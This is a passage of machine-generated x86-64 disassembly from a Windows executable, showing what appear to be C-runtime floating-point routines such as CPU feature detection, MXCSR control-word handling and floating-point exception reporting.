   14000ccd4:	75 11                	jne    0x14000cce7
   14000ccd6:	8b 45 bf             	mov    -0x41(%rbp),%eax
   14000ccd9:	83 e0 e3             	and    $0xffffffe3,%eax
   14000ccdc:	f2 0f 11 75 af       	movsd  %xmm6,-0x51(%rbp)
   14000cce1:	83 c8 03             	or     $0x3,%eax
   14000cce4:	89 45 bf             	mov    %eax,-0x41(%rbp)
   14000cce7:	44 8b 45 5f          	mov    0x5f(%rbp),%r8d
   14000cceb:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   14000ccf0:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000ccf5:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000ccfa:	48 8d 45 6f          	lea    0x6f(%rbp),%rax
   14000ccfe:	44 8b ce             	mov    %esi,%r9d
   14000cd01:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000cd06:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000cd0b:	e8 10 02 00 00       	call   0x14000cf20
   14000cd10:	e8 87 6c ff ff       	call   0x14000399c
   14000cd15:	84 c0                	test   %al,%al
   14000cd17:	74 34                	je     0x14000cd4d
   14000cd19:	85 ff                	test   %edi,%edi
   14000cd1b:	74 30                	je     0x14000cd4d
   14000cd1d:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   14000cd22:	4d 8b c6             	mov    %r14,%r8
   14000cd25:	f2 0f 10 44 24 48    	movsd  0x48(%rsp),%xmm0
   14000cd2b:	8b cf                	mov    %edi,%ecx
   14000cd2d:	f2 0f 10 5d 6f       	movsd  0x6f(%rbp),%xmm3
   14000cd32:	8b 55 67             	mov    0x67(%rbp),%edx
   14000cd35:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000cd3a:	f2 0f 11 44 24 28    	movsd  %xmm0,0x28(%rsp)
   14000cd40:	f2 0f 11 74 24 20    	movsd  %xmm6,0x20(%rsp)
   14000cd46:	e8 f5 fd ff ff       	call   0x14000cb40
   14000cd4b:	eb 1c                	jmp    0x14000cd69
   14000cd4d:	8b cf                	mov    %edi,%ecx
   14000cd4f:	e8 04 05 00 00       	call   0x14000d258
   14000cd54:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   14000cd59:	ba c0 ff 00 00       	mov    $0xffc0,%edx
   14000cd5e:	e8 45 05 00 00       	call   0x14000d2a8
   14000cd63:	f2 0f 10 44 24 48    	movsd  0x48(%rsp),%xmm0
   14000cd69:	48 8b 4d ef          	mov    -0x11(%rbp),%rcx
   14000cd6d:	48 33 cc             	xor    %rsp,%rcx
   14000cd70:	e8 7b 06 00 00       	call   0x14000d3f0
   14000cd75:	0f 28 b4 24 e0 00 00 	movaps 0xe0(%rsp),%xmm6
   14000cd7c:	00 
   14000cd7d:	48 81 c4 f0 00 00 00 	add    $0xf0,%rsp
   14000cd84:	41 5e                	pop    %r14
   14000cd86:	5f                   	pop    %rdi
   14000cd87:	5e                   	pop    %rsi
   14000cd88:	5b                   	pop    %rbx
   14000cd89:	5d                   	pop    %rbp
   14000cd8a:	c3                   	ret
   14000cd8b:	cc                   	int3
   14000cd8c:	cc                   	int3
   14000cd8d:	cc                   	int3
   14000cd8e:	cc                   	int3
   14000cd8f:	cc                   	int3
   14000cd90:	40 53                	rex push %rbx
   14000cd92:	48 83 ec 10          	sub    $0x10,%rsp
   14000cd96:	45 33 c0             	xor    %r8d,%r8d
   14000cd99:	33 c9                	xor    %ecx,%ecx
   14000cd9b:	44 89 05 d6 b8 00 00 	mov    %r8d,0xb8d6(%rip)        # 0x140018678
   14000cda2:	45 8d 48 01          	lea    0x1(%r8),%r9d
   14000cda6:	41 8b c1             	mov    %r9d,%eax
   14000cda9:	0f a2                	cpuid
   14000cdab:	89 04 24             	mov    %eax,(%rsp)
   14000cdae:	b8 00 10 00 18       	mov    $0x18001000,%eax
   14000cdb3:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000cdb7:	23 c8                	and    %eax,%ecx
   14000cdb9:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   14000cdbd:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   14000cdc1:	3b c8                	cmp    %eax,%ecx
   14000cdc3:	75 2c                	jne    0x14000cdf1
   14000cdc5:	33 c9                	xor    %ecx,%ecx
   14000cdc7:	0f 01 d0             	xgetbv
   14000cdca:	48 c1 e2 20          	shl    $0x20,%rdx
   14000cdce:	48 0b d0             	or     %rax,%rdx
   14000cdd1:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   14000cdd6:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000cddb:	44 8b 05 96 b8 00 00 	mov    0xb896(%rip),%r8d        # 0x140018678
   14000cde2:	24 06                	and    $0x6,%al
   14000cde4:	3c 06                	cmp    $0x6,%al
   14000cde6:	45 0f 44 c1          	cmove  %r9d,%r8d
   14000cdea:	44 89 05 87 b8 00 00 	mov    %r8d,0xb887(%rip)        # 0x140018678
   14000cdf1:	44 89 05 84 b8 00 00 	mov    %r8d,0xb884(%rip)        # 0x14001867c
   14000cdf8:	33 c0                	xor    %eax,%eax
   14000cdfa:	48 83 c4 10          	add    $0x10,%rsp
   14000cdfe:	5b                   	pop    %rbx
   14000cdff:	c3                   	ret
   14000ce00:	48 83 ec 38          	sub    $0x38,%rsp
   14000ce04:	48 8d 05 a5 87 00 00 	lea    0x87a5(%rip),%rax        # 0x1400155b0
   14000ce0b:	41 b9 1b 00 00 00    	mov    $0x1b,%r9d
   14000ce11:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000ce16:	e8 05 00 00 00       	call   0x14000ce20
   14000ce1b:	48 83 c4 38          	add    $0x38,%rsp
   14000ce1f:	c3                   	ret
   14000ce20:	48 8b c4             	mov    %rsp,%rax
   14000ce23:	48 83 ec 68          	sub    $0x68,%rsp
   14000ce27:	0f 29 70 e8          	movaps %xmm6,-0x18(%rax)
   14000ce2b:	0f 28 f1             	movaps %xmm1,%xmm6
   14000ce2e:	41 8b d1             	mov    %r9d,%edx
   14000ce31:	0f 28 d8             	movaps %xmm0,%xmm3
   14000ce34:	41 83 e8 01          	sub    $0x1,%r8d
   14000ce38:	74 2a                	je     0x14000ce64
   14000ce3a:	41 83 f8 01          	cmp    $0x1,%r8d
   14000ce3e:	75 69                	jne    0x14000cea9
   14000ce40:	44 89 40 d8          	mov    %r8d,-0x28(%rax)
   14000ce44:	0f 57 d2             	xorps  %xmm2,%xmm2
   14000ce47:	f2 0f 11 50 d0       	movsd  %xmm2,-0x30(%rax)
   14000ce4c:	45 8b c8             	mov    %r8d,%r9d
   14000ce4f:	f2 0f 11 40 c8       	movsd  %xmm0,-0x38(%rax)
   14000ce54:	c7 40 c0 21 00 00 00 	movl   $0x21,-0x40(%rax)
   14000ce5b:	c7 40 b8 08 00 00 00 	movl   $0x8,-0x48(%rax)
   14000ce62:	eb 2d                	jmp    0x14000ce91
   14000ce64:	c7 44 24 40 01 00 00 	movl   $0x1,0x40(%rsp)
   14000ce6b:	00 
   14000ce6c:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000ce6f:	f2 0f 11 44 24 38    	movsd  %xmm0,0x38(%rsp)
   14000ce75:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   14000ce7b:	f2 0f 11 5c 24 30    	movsd  %xmm3,0x30(%rsp)
   14000ce81:	c7 44 24 28 22 00 00 	movl   $0x22,0x28(%rsp)
   14000ce88:	00 
   14000ce89:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   14000ce90:	00 
   14000ce91:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   14000ce98:	00 
   14000ce99:	f2 0f 11 74 24 78    	movsd  %xmm6,0x78(%rsp)
   14000ce9f:	4c 8b 44 24 78       	mov    0x78(%rsp),%r8
   14000cea4:	e8 bb fd ff ff       	call   0x14000cc64
   14000cea9:	0f 28 c6             	movaps %xmm6,%xmm0
   14000ceac:	0f 28 74 24 50       	movaps 0x50(%rsp),%xmm6
   14000ceb1:	48 83 c4 68          	add    $0x68,%rsp
   14000ceb5:	c3                   	ret
   14000ceb6:	cc                   	int3
   14000ceb7:	cc                   	int3
   14000ceb8:	cc                   	int3
   14000ceb9:	cc                   	int3
   14000ceba:	cc                   	int3
   14000cebb:	cc                   	int3
   14000cebc:	cc                   	int3
   14000cebd:	cc                   	int3
   14000cebe:	cc                   	int3
   14000cebf:	cc                   	int3
   14000cec0:	cc                   	int3
   14000cec1:	cc                   	int3
   14000cec2:	cc                   	int3
   14000cec3:	cc                   	int3
   14000cec4:	cc                   	int3
   14000cec5:	cc                   	int3
   14000cec6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000cecd:	00 00 00 
   14000ced0:	48 83 ec 08          	sub    $0x8,%rsp
   14000ced4:	0f ae 1c 24          	stmxcsr (%rsp)
   14000ced8:	8b 04 24             	mov    (%rsp),%eax
   14000cedb:	48 83 c4 08          	add    $0x8,%rsp
   14000cedf:	c3                   	ret
   14000cee0:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000cee4:	0f ae 54 24 08       	ldmxcsr 0x8(%rsp)
   14000cee9:	c3                   	ret
   14000ceea:	0f ae 5c 24 08       	stmxcsr 0x8(%rsp)
   14000ceef:	b9 c0 ff ff ff       	mov    $0xffffffc0,%ecx
   14000cef4:	21 4c 24 08          	and    %ecx,0x8(%rsp)
   14000cef8:	0f ae 54 24 08       	ldmxcsr 0x8(%rsp)
   14000cefd:	c3                   	ret
   14000cefe:	66 0f 2e 05 ba 86 00 	ucomisd 0x86ba(%rip),%xmm0        # 0x1400155c0
   14000cf05:	00 
   14000cf06:	73 14                	jae    0x14000cf1c
   14000cf08:	66 0f 2e 05 b8 86 00 	ucomisd 0x86b8(%rip),%xmm0        # 0x1400155c8
   14000cf0f:	00 
   14000cf10:	76 0a                	jbe    0x14000cf1c
   14000cf12:	f2 48 0f 2d c8       	cvtsd2si %xmm0,%rcx
   14000cf17:	f2 48 0f 2a c1       	cvtsi2sd %rcx,%xmm0
   14000cf1c:	c3                   	ret
   14000cf1d:	cc                   	int3
   14000cf1e:	cc                   	int3
   14000cf1f:	cc                   	int3
   14000cf20:	48 83 ec 48          	sub    $0x48,%rsp
   14000cf24:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   14000cf29:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   14000cf2e:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000cf33:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   14000cf38:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000cf3d:	e8 06 00 00 00       	call   0x14000cf48
   14000cf42:	48 83 c4 48          	add    $0x48,%rsp
   14000cf46:	c3                   	ret
   14000cf47:	cc                   	int3
   14000cf48:	48 8b c4             	mov    %rsp,%rax
   14000cf4b:	48 89 58 10          	mov    %rbx,0x10(%rax)
   14000cf4f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000cf53:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000cf57:	48 89 48 08          	mov    %rcx,0x8(%rax)
   14000cf5b:	55                   	push   %rbp
   14000cf5c:	48 8b ec             	mov    %rsp,%rbp
   14000cf5f:	48 83 ec 20          	sub    $0x20,%rsp
   14000cf63:	48 8b da             	mov    %rdx,%rbx
   14000cf66:	41 8b f1             	mov    %r9d,%esi
   14000cf69:	33 d2                	xor    %edx,%edx
   14000cf6b:	bf 0d 00 00 c0       	mov    $0xc000000d,%edi
   14000cf70:	89 51 04             	mov    %edx,0x4(%rcx)
   14000cf73:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000cf77:	89 50 08             	mov    %edx,0x8(%rax)
   14000cf7a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000cf7e:	89 50 0c             	mov    %edx,0xc(%rax)
   14000cf81:	41 f6 c0 10          	test   $0x10,%r8b
   14000cf85:	74 0d                	je     0x14000cf94
   14000cf87:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000cf8b:	bf 8f 00 00 c0       	mov    $0xc000008f,%edi
   14000cf90:	83 48 04 01          	orl    $0x1,0x4(%rax)
   14000cf94:	41 f6 c0 02          	test   $0x2,%r8b
   14000cf98:	74 0d                	je     0x14000cfa7
   14000cf9a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000cf9e:	bf 93 00 00 c0       	mov    $0xc0000093,%edi
   14000cfa3:	83 48 04 02          	orl    $0x2,0x4(%rax)
   14000cfa7:	41 f6 c0 01          	test   $0x1,%r8b
   14000cfab:	74 0d                	je     0x14000cfba
   14000cfad:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000cfb1:	bf 91 00 00 c0       	mov    $0xc0000091,%edi
   14000cfb6:	83 48 04 04          	orl    $0x4,0x4(%rax)
   14000cfba:	41 f6 c0 04          	test   $0x4,%r8b
   14000cfbe:	74 0d                	je     0x14000cfcd
   14000cfc0:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000cfc4:	bf 8e 00 00 c0       	mov    $0xc000008e,%edi
   14000cfc9:	83 48 04 08          	orl    $0x8,0x4(%rax)
   14000cfcd:	41 f6 c0 08          	test   $0x8,%r8b
   14000cfd1:	74 0d                	je     0x14000cfe0
   14000cfd3:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000cfd7:	bf 90 00 00 c0       	mov    $0xc0000090,%edi
   14000cfdc:	83 48 04 10          	orl    $0x10,0x4(%rax)
   14000cfe0:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000cfe4:	48 8b 03             	mov    (%rbx),%rax
   14000cfe7:	48 c1 e8 07          	shr    $0x7,%rax
   14000cfeb:	c1 e0 04             	shl    $0x4,%eax
   14000cfee:	f7 d0                	not    %eax
   14000cff0:	33 41 08             	xor    0x8(%rcx),%eax
   14000cff3:	83 e0 10             	and    $0x10,%eax
   14000cff6:	31 41 08             	xor    %eax,0x8(%rcx)
   14000cff9:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000cffd:	48 8b 03             	mov    (%rbx),%rax
   14000d000:	48 c1 e8 09          	shr    $0x9,%rax
   14000d004:	c1 e0 03             	shl    $0x3,%eax
   14000d007:	f7 d0                	not    %eax
   14000d009:	33 41 08             	xor    0x8(%rcx),%eax
   14000d00c:	83 e0 08             	and    $0x8,%eax
   14000d00f:	31 41 08             	xor    %eax,0x8(%rcx)
   14000d012:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000d016:	48 8b 03             	mov    (%rbx),%rax
   14000d019:	48 c1 e8 0a          	shr    $0xa,%rax
   14000d01d:	c1 e0 02             	shl    $0x2,%eax
   14000d020:	f7 d0                	not    %eax
   14000d022:	33 41 08             	xor    0x8(%rcx),%eax
   14000d025:	83 e0 04             	and    $0x4,%eax
   14000d028:	31 41 08             	xor    %eax,0x8(%rcx)
   14000d02b:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000d02f:	48 8b 03             	mov    (%rbx),%rax
   14000d032:	48 c1 e8 0b          	shr    $0xb,%rax
   14000d036:	03 c0                	add    %eax,%eax
   14000d038:	f7 d0                	not    %eax
   14000d03a:	33 41 08             	xor    0x8(%rcx),%eax
   14000d03d:	83 e0 02             	and    $0x2,%eax
   14000d040:	31 41 08             	xor    %eax,0x8(%rcx)
   14000d043:	8b 03                	mov    (%rbx),%eax
   14000d045:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000d049:	48 c1 e8 0c          	shr    $0xc,%rax
   14000d04d:	f7 d0                	not    %eax
   14000d04f:	33 41 08             	xor    0x8(%rcx),%eax
   14000d052:	83 e0 01             	and    $0x1,%eax
   14000d055:	31 41 08             	xor    %eax,0x8(%rcx)
   14000d058:	e8 e7 02 00 00       	call   0x14000d344
   14000d05d:	48 8b d0             	mov    %rax,%rdx
   14000d060:	a8 01                	test   $0x1,%al
   14000d062:	74 08                	je     0x14000d06c
   14000d064:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000d068:	83 49 0c 10          	orl    $0x10,0xc(%rcx)
   14000d06c:	f6 c2 04             	test   $0x4,%dl
   14000d06f:	74 08                	je     0x14000d079
   14000d071:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000d075:	83 49 0c 08          	orl    $0x8,0xc(%rcx)
   14000d079:	f6 c2 08             	test   $0x8,%dl
   14000d07c:	74 08                	je     0x14000d086
   14000d07e:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d082:	83 48 0c 04          	orl    $0x4,0xc(%rax)
   14000d086:	f6 c2 10             	test   $0x10,%dl
   14000d089:	74 08                	je     0x14000d093
   14000d08b:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d08f:	83 48 0c 02          	orl    $0x2,0xc(%rax)
   14000d093:	f6 c2 20             	test   $0x20,%dl
   14000d096:	74 08                	je     0x14000d0a0
   14000d098:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d09c:	83 48 0c 01          	orl    $0x1,0xc(%rax)
   14000d0a0:	8b 03                	mov    (%rbx),%eax
   14000d0a2:	b9 00 60 00 00       	mov    $0x6000,%ecx
   14000d0a7:	48 23 c1             	and    %rcx,%rax
   14000d0aa:	74 3e                	je     0x14000d0ea
   14000d0ac:	48 3d 00 20 00 00    	cmp    $0x2000,%rax
   14000d0b2:	74 26                	je     0x14000d0da
   14000d0b4:	48 3d 00 40 00 00    	cmp    $0x4000,%rax
   14000d0ba:	74 0e                	je     0x14000d0ca
   14000d0bc:	48 3b c1             	cmp    %rcx,%rax
   14000d0bf:	75 30                	jne    0x14000d0f1
   14000d0c1:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d0c5:	83 08 03             	orl    $0x3,(%rax)
   14000d0c8:	eb 27                	jmp    0x14000d0f1
   14000d0ca:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d0ce:	83 20 fe             	andl   $0xfffffffe,(%rax)
   14000d0d1:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d0d5:	83 08 02             	orl    $0x2,(%rax)
   14000d0d8:	eb 17                	jmp    0x14000d0f1
   14000d0da:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d0de:	83 20 fd             	andl   $0xfffffffd,(%rax)
   14000d0e1:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d0e5:	83 08 01             	orl    $0x1,(%rax)
   14000d0e8:	eb 07                	jmp    0x14000d0f1
   14000d0ea:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d0ee:	83 20 fc             	andl   $0xfffffffc,(%rax)
   14000d0f1:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d0f5:	81 e6 ff 0f 00 00    	and    $0xfff,%esi
   14000d0fb:	c1 e6 05             	shl    $0x5,%esi
   14000d0fe:	81 20 1f 00 fe ff    	andl   $0xfffe001f,(%rax)
   14000d104:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d108:	09 30                	or     %esi,(%rax)
   14000d10a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d10e:	48 8b 75 38          	mov    0x38(%rbp),%rsi
   14000d112:	83 48 20 01          	orl    $0x1,0x20(%rax)
   14000d116:	83 7d 40 00          	cmpl   $0x0,0x40(%rbp)
   14000d11a:	74 33                	je     0x14000d14f
   14000d11c:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d120:	ba e1 ff ff ff       	mov    $0xffffffe1,%edx
   14000d125:	21 50 20             	and    %edx,0x20(%rax)
   14000d128:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000d12c:	8b 08                	mov    (%rax),%ecx
   14000d12e:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d132:	89 48 10             	mov    %ecx,0x10(%rax)
   14000d135:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d139:	83 48 60 01          	orl    $0x1,0x60(%rax)
   14000d13d:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d141:	21 50 60             	and    %edx,0x60(%rax)
   14000d144:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d148:	8b 0e                	mov    (%rsi),%ecx
   14000d14a:	89 48 50             	mov    %ecx,0x50(%rax)
   14000d14d:	eb 48                	jmp    0x14000d197
   14000d14f:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000d153:	41 b8 e3 ff ff ff    	mov    $0xffffffe3,%r8d
   14000d159:	8b 41 20             	mov    0x20(%rcx),%eax
   14000d15c:	41 23 c0             	and    %r8d,%eax
   14000d15f:	83 c8 02             	or     $0x2,%eax
   14000d162:	89 41 20             	mov    %eax,0x20(%rcx)
   14000d165:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000d169:	48 8b 08             	mov    (%rax),%rcx
   14000d16c:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d170:	48 89 48 10          	mov    %rcx,0x10(%rax)
   14000d174:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d178:	83 48 60 01          	orl    $0x1,0x60(%rax)
   14000d17c:	48 8b 55 10          	mov    0x10(%rbp),%rdx
   14000d180:	8b 42 60             	mov    0x60(%rdx),%eax
   14000d183:	41 23 c0             	and    %r8d,%eax
   14000d186:	83 c8 02             	or     $0x2,%eax
   14000d189:	89 42 60             	mov    %eax,0x60(%rdx)
   14000d18c:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000d190:	48 8b 16             	mov    (%rsi),%rdx
   14000d193:	48 89 50 50          	mov    %rdx,0x50(%rax)
   14000d197:	e8 ec 00 00 00       	call   0x14000d288
   14000d19c:	33 d2                	xor    %edx,%edx
   14000d19e:	4c 8d 4d 10          	lea    0x10(%rbp),%r9
   14000d1a2:	8b cf                	mov    %edi,%ecx
   14000d1a4:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   14000d1a8:	ff 15 f2 0e 00 00    	call   *0xef2(%rip)        # 0x14000e0a0
   14000d1ae:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000d1b2:	8b 41 08             	mov    0x8(%rcx),%eax
   14000d1b5:	a8 10                	test   $0x10,%al
   14000d1b7:	74 08                	je     0x14000d1c1
   14000d1b9:	48 0f ba 33 07       	btrq   $0x7,(%rbx)
   14000d1be:	8b 41 08             	mov    0x8(%rcx),%eax
   14000d1c1:	a8 08                	test   $0x8,%al
   14000d1c3:	74 08                	je     0x14000d1cd
   14000d1c5:	48 0f ba 33 09       	btrq   $0x9,(%rbx)
   14000d1ca:	8b 41 08             	mov    0x8(%rcx),%eax
   14000d1cd:	a8 04                	test   $0x4,%al
   14000d1cf:	74 08                	je     0x14000d1d9
   14000d1d1:	48 0f ba 33 0a       	btrq   $0xa,(%rbx)
   14000d1d6:	8b 41 08             	mov    0x8(%rcx),%eax
   14000d1d9:	a8 02                	test   $0x2,%al
   14000d1db:	74 08                	je     0x14000d1e5
   14000d1dd:	48 0f ba 33 0b       	btrq   $0xb,(%rbx)
   14000d1e2:	8b 41 08             	mov    0x8(%rcx),%eax
   14000d1e5:	a8 01                	test   $0x1,%al
   14000d1e7:	74 05                	je     0x14000d1ee
   14000d1e9:	48 0f ba 33 0c       	btrq   $0xc,(%rbx)
   14000d1ee:	8b 01                	mov    (%rcx),%eax
   14000d1f0:	83 e0 03             	and    $0x3,%eax
   14000d1f3:	74 30                	je     0x14000d225
   14000d1f5:	83 e8 01             	sub    $0x1,%eax
   14000d1f8:	74 1f                	je     0x14000d219
   14000d1fa:	83 e8 01             	sub    $0x1,%eax
   14000d1fd:	74 0e                	je     0x14000d20d
   14000d1ff:	83 f8 01             	cmp    $0x1,%eax
   14000d202:	75 28                	jne    0x14000d22c
   14000d204:	48 81 0b 00 60 00 00 	orq    $0x6000,(%rbx)
   14000d20b:	eb 1f                	jmp    0x14000d22c
   14000d20d:	48 0f ba 33 0d       	btrq   $0xd,(%rbx)
   14000d212:	48 0f ba 2b 0e       	btsq   $0xe,(%rbx)
   14000d217:	eb 13                	jmp    0x14000d22c
   14000d219:	48 0f ba 33 0e       	btrq   $0xe,(%rbx)
   14000d21e:	48 0f ba 2b 0d       	btsq   $0xd,(%rbx)
   14000d223:	eb 07                	jmp    0x14000d22c
   14000d225:	48 81 23 ff 9f ff ff 	andq   $0xffffffffffff9fff,(%rbx)
   14000d22c:	83 7d 40 00          	cmpl   $0x0,0x40(%rbp)
   14000d230:	74 07                	je     0x14000d239
   14000d232:	8b 41 50             	mov    0x50(%rcx),%eax
   14000d235:	89 06                	mov    %eax,(%rsi)
   14000d237:	eb 07                	jmp    0x14000d240
   14000d239:	48 8b 41 50          	mov    0x50(%rcx),%rax
   14000d23d:	48 89 06             	mov    %rax,(%rsi)
   14000d240:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   14000d245:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000d24a:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   14000d24f:	48 83 c4 20          	add    $0x20,%rsp
   14000d253:	5d                   	pop    %rbp
   14000d254:	c3                   	ret
   14000d255:	cc                   	int3
   14000d256:	cc                   	int3
   14000d257:	cc                   	int3
   14000d258:	48 83 ec 28          	sub    $0x28,%rsp
   14000d25c:	83 f9 01             	cmp    $0x1,%ecx
   14000d25f:	74 15                	je     0x14000d276
   14000d261:	8d 41 fe             	lea    -0x2(%rcx),%eax
   14000d264:	83 f8 01             	cmp    $0x1,%eax
   14000d267:	77 18                	ja     0x14000d281
   14000d269:	e8 52 85 ff ff       	call   0x1400057c0
   14000d26e:	c7 00 22 00 00 00    	movl   $0x22,(%rax)
   14000d274:	eb 0b                	jmp    0x14000d281
   14000d276:	e8 45 85 ff ff       	call   0x1400057c0
   14000d27b:	c7 00 21 00 00 00    	movl   $0x21,(%rax)
   14000d281:	48 83 c4 28          	add    $0x28,%rsp
   14000d285:	c3                   	ret
   14000d286:	cc                   	int3
   14000d287:	cc                   	int3
   14000d288:	40 53                	rex push %rbx
   14000d28a:	48 83 ec 20          	sub    $0x20,%rsp
   14000d28e:	e8 3d fc ff ff       	call   0x14000ced0
   14000d293:	8b d8                	mov    %eax,%ebx
   14000d295:	83 e3 3f             	and    $0x3f,%ebx
   14000d298:	e8 4d fc ff ff       	call   0x14000ceea
   14000d29d:	8b c3                	mov    %ebx,%eax
   14000d29f:	48 83 c4 20          	add    $0x20,%rsp
   14000d2a3:	5b                   	pop    %rbx
   14000d2a4:	c3                   	ret
   14000d2a5:	cc                   	int3
   14000d2a6:	cc                   	int3
   14000d2a7:	cc                   	int3
   14000d2a8:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000d2ad:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000d2b2:	57                   	push   %rdi
   14000d2b3:	48 83 ec 20          	sub    $0x20,%rsp
   14000d2b7:	48 8b da             	mov    %rdx,%rbx
   14000d2ba:	48 8b f9             	mov    %rcx,%rdi
   14000d2bd:	e8 0e fc ff ff       	call   0x14000ced0
   14000d2c2:	8b f0                	mov    %eax,%esi
   14000d2c4:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000d2c8:	8b cb                	mov    %ebx,%ecx
   14000d2ca:	f7 d1                	not    %ecx
   14000d2cc:	81 c9 7f 80 ff ff    	or     $0xffff807f,%ecx
   14000d2d2:	23 c8                	and    %eax,%ecx
   14000d2d4:	23 fb                	and    %ebx,%edi
   14000d2d6:	0b cf                	or     %edi,%ecx
   14000d2d8:	89 4c 24 30          	mov    %ecx,0x30(%rsp)
   14000d2dc:	80 3d fd a6 00 00 00 	cmpb   $0x0,0xa6fd(%rip)        # 0x1400179e0
   14000d2e3:	74 25                	je     0x14000d30a
   14000d2e5:	f6 c1 40             	test   $0x40,%cl
   14000d2e8:	74 20                	je     0x14000d30a
   14000d2ea:	e8 f1 fb ff ff       	call   0x14000cee0
   14000d2ef:	eb 21                	jmp    0x14000d312
   14000d2f1:	c6 05 e8 a6 00 00 00 	movb   $0x0,0xa6e8(%rip)        # 0x1400179e0
   14000d2f8:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   14000d2fc:	83 e1 bf             	and    $0xffffffbf,%ecx
   14000d2ff:	e8 dc fb ff ff       	call   0x14000cee0
   14000d304:	8b 74 24 38          	mov    0x38(%rsp),%esi
   14000d308:	eb 08                	jmp    0x14000d312
   14000d30a:	83 e1 bf             	and    $0xffffffbf,%ecx
   14000d30d:	e8 ce fb ff ff       	call   0x14000cee0
   14000d312:	8b c6                	mov    %esi,%eax
   14000d314:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000d319:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   14000d31e:	48 83 c4 20          	add    $0x20,%rsp
   14000d322:	5f                   	pop    %rdi
   14000d323:	c3                   	ret
   14000d324:	40 53                	rex push %rbx
   14000d326:	48 83 ec 20          	sub    $0x20,%rsp
   14000d32a:	48 8b d9             	mov    %rcx,%rbx
   14000d32d:	e8 9e fb ff ff       	call   0x14000ced0
   14000d332:	83 e3 3f             	and    $0x3f,%ebx
   14000d335:	0b c3                	or     %ebx,%eax
   14000d337:	8b c8                	mov    %eax,%ecx
   14000d339:	48 83 c4 20          	add    $0x20,%rsp
   14000d33d:	5b                   	pop    %rbx
   14000d33e:	e9 9d fb ff ff       	jmp    0x14000cee0
   14000d343:	cc                   	int3
   14000d344:	48 83 ec 28          	sub    $0x28,%rsp
   14000d348:	e8 83 fb ff ff       	call   0x14000ced0
   14000d34d:	83 e0 3f             	and    $0x3f,%eax
   14000d350:	48 83 c4 28          	add    $0x28,%rsp
   14000d354:	c3                   	ret
   14000d355:	cc                   	int3
   14000d356:	cc                   	int3
   14000d357:	cc                   	int3
   14000d358:	48 83 ec 28          	sub    $0x28,%rsp
   14000d35c:	4d 8b 41 38          	mov    0x38(%r9),%r8
